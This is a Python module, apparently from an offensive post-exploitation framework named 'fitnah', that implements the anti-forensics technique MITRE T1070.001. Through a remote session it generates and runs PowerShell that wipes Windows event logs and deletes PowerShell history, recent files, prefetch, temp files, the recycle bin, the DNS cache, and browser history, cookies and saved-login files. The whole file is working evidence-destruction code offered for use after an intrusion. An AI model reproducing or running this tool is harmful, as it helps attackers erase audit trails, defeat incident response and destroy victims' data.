"""defense_evasion/clear_logs — thorough Windows log/artifact cleanup. MITRE T1070.001"""
from fitnah.sdk import BasePlugin, ModuleResult, Param, ParamSchema, mitre

_DEFAULT_LOGS = "System,Security,Application,Microsoft-Windows-PowerShell/Operational,Microsoft-Windows-WMI-Activity/Operational"


class ClearLogs(BasePlugin):
    NAME        = "clear_logs"
    DESCRIPTION = "Clear event logs, PS history, prefetch, recent files, DNS cache, browser history, TEMP."
    AUTHOR      = "fitnah-team"
    MITRE       = "T1070.001"
    CATEGORY    = "defense_evasion"
    schema      = ParamSchema().add(
        Param("logs",         str,  required=False, default=_DEFAULT_LOGS,
              help="Comma-separated channel names or 'all' for every channel"),
        Param("all_channels", bool, required=False, default=False,
              help="Clear ALL wevtutil-enumerable channels"),
        Param("dns",          bool, required=False, default=True,
              help="Flush DNS cache (ipconfig /flushdns)"),
        Param("temp",         bool, required=False, default=False,
              help="Delete files from TEMP older than 10 min"),
        Param("browser",      bool, required=False, default=False,
              help="Clear Chrome/Edge/Firefox history files"),
        Param("prefetch",     bool, required=False, default=True,
              help="Delete prefetch files (requires admin)"),
    )

    @mitre("T1070.001")
    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        all_ch   = params.get("all_channels", False)
        logs     = params.get("logs",         _DEFAULT_LOGS)
        flush_dns = params.get("dns",         True)
        do_temp  = params.get("temp",         False)
        do_browser = params.get("browser",    False)
        do_prefetch = params.get("prefetch",  True)

        blocks = []

        # Event logs
        if all_ch:
            blocks.append(
                "$cleared=0;"
                "wevtutil el | ForEach-Object { try{wevtutil cl $_ 2>&1|Out-Null;$cleared++}catch{} };"
                "Write-Output \"[+] Event logs cleared: $cleared channels\";"
            )
        else:
            chs = [c.strip() for c in logs.split(",") if c.strip()]
            clr = "; ".join(f'try{{wevtutil cl "{c}" 2>&1|Out-Null}}catch{{}}' for c in chs)
            blocks.append(
                f"{clr};"
                f"Write-Output '[+] Event logs cleared: {', '.join(chs)}';"
            )

        # PS history
        blocks.append(
            "$hf=\"$env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\";"
            "if(Test-Path $hf){Remove-Item $hf -Force -EA SilentlyContinue;Write-Output '[+] PS history deleted'}"
            "else{Write-Output '[-] PS history: not found'};"
        )

        # Recent files & jump lists
        blocks.append(
            "$rc=\"$env:APPDATA\\Microsoft\\Windows\\Recent\";"
            "$n=(Get-ChildItem $rc -Force -EA SilentlyContinue).Count;"
            "Get-ChildItem $rc -Force -EA SilentlyContinue|Remove-Item -Force -Recurse -EA SilentlyContinue;"
            "Write-Output \"[+] Recent items removed: $n\";"
        )

        # Recycle bin
        blocks.append(
            "try{Clear-RecycleBin -Force -EA Stop;Write-Output '[+] Recycle bin emptied'}"
            "catch{Write-Output \"[-] Recycle bin: $_\"};"
        )

        if do_prefetch:
            blocks.append(
                "try{"
                "  $pf=Get-ChildItem 'C:\\Windows\\Prefetch\\*.pf' -EA Stop;"
                "  $pf|Remove-Item -Force -EA SilentlyContinue;"
                "  Write-Output \"[+] Prefetch deleted: $($pf.Count) files\""
                "}catch{Write-Output \"[-] Prefetch: $_\"};"
            )

        if flush_dns:
            blocks.append(
                "ipconfig /flushdns | Out-Null;"
                "Write-Output '[+] DNS cache flushed';"
            )

        if do_temp:
            blocks.append(
                "$cutoff=(Get-Date).AddMinutes(-10);"
                "$tf=Get-ChildItem $env:TEMP -Force -EA SilentlyContinue"
                "  |Where-Object{$_.LastWriteTime -lt $cutoff};"
                "$tf|Remove-Item -Force -Recurse -EA SilentlyContinue;"
                "Write-Output \"[+] TEMP files removed: $($tf.Count)\";"
            )

        if do_browser:
            blocks.append(
                # Chrome
                "$ch=\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\";"
                "if(Test-Path $ch){"
                "  @('History','History-journal','Cookies','Login Data') |"
                "    ForEach-Object{Remove-Item \"$ch\\$_\" -Force -EA SilentlyContinue};"
                "  Write-Output '[+] Chrome history/cookies cleared'"
                "};"
                # Edge
                "$ed=\"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\";"
                "if(Test-Path $ed){"
                "  @('History','Cookies','Login Data')|"
                "    ForEach-Object{Remove-Item \"$ed\\$_\" -Force -EA SilentlyContinue};"
                "  Write-Output '[+] Edge history/cookies cleared'"
                "};"
                # Firefox
                "$ff=Get-ChildItem \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\" -EA SilentlyContinue|Select-Object -First 1;"
                "if($ff){"
                "  @('places.sqlite','cookies.sqlite','formhistory.sqlite')|"
                "    ForEach-Object{Remove-Item \"$($ff.FullName)\\$_\" -Force -EA SilentlyContinue};"
                "  Write-Output '[+] Firefox history/cookies cleared'"
                "};"
            )

        blocks.append("Write-Output '[+] Cleanup complete'")
        ps = " ".join(blocks)
        r  = ctx.ps(ps)
        if r["status"] not in ("ok", "error"):
            return ModuleResult.err("Dispatch failed")
        return ModuleResult.ok(data=r["output"])
